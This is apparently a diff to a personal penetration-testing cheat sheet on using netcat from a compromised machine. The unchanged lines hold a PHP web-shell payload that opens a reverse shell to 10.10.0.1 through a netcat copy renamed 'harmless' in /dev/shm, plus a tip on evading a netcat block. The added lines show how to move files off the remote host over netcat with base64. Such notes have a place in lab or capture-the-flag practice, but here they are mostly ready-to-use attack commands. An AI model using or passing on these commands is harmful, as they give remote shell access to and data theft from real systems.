@@ -23,3 +23,17 @@ If having issues with netcat, could be blocked. Copy it to a new location and gi
 Connect to local host with harmless netcat:
 <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/harmless 10.10.0.1 1234 >/tmp/f') ?>
 
+Transferring files with netcat
+============================
+Piping through base64 to help prevent file corruption. Can check md5sum on remote before and on local after to ensure 100% transfer.
+
+Local Machine:
+nc -lnvp 1235 | base64 -d > filename.wav
+
+Remote:
+md5sum filename.wav
+base64 filename.wav | /dev/shm/harmless -w 3 10.10.0.1 1235
+
+Local:
+md5sum filename.wav
+
